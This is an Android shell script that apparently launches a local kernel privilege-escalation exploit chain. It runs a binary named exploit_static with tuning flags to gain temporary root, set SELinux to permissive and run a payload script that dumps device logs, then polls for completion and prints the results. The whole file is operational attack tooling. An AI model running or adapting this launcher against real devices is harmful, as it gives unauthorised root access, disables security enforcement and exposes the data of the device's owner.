#!/system/bin/sh
# Short chain: hijack -> anchor -> owner -> verify -> cred -> permissive, then dump logs.
D=/data/local/tmp
LOG=$D/run.log
echo "=== short chain: temp root + permissive + dump logs ==="
cd $D || exit 1
rm -f $LOG
( DURABLE_LOG=$LOG FLIP_PERMISSIVE=1 NO_RSCAN=1 KSU_LOADER=0 \
  AGENT_SCRIPT=$D/dump_logs.sh SYSCTL_WALK_ATTEMPTS=1 SLIDE_SELFCONTAINED=1 \
  SLIDE_SIGNAL_WAKE=1 SLIDE_WAIT_SECS=0 SLIDE_SIGRET_BUF_BYTE=0x10 \
  SLIDE_NO_RESTORE=1 KS_MAX_TRIES=1 SLIDE_NOKILL=1 \
  ./exploit_static > /dev/null 2>&1 & )
n=0
while [ $n -lt 45 ]; do
  grep -q 'chain complete' $LOG 2>/dev/null && break
  sleep 2; n=$((n+1))
done
echo "--- run.log tail ---"
tail -8 $LOG 2>&1
echo "--- dumplogs ---"
ls -la $D/dumplogs 2>&1 | head -12
echo "--- agent.out tail ---"
tail -12 $D/dumplogs/agent.out 2>&1
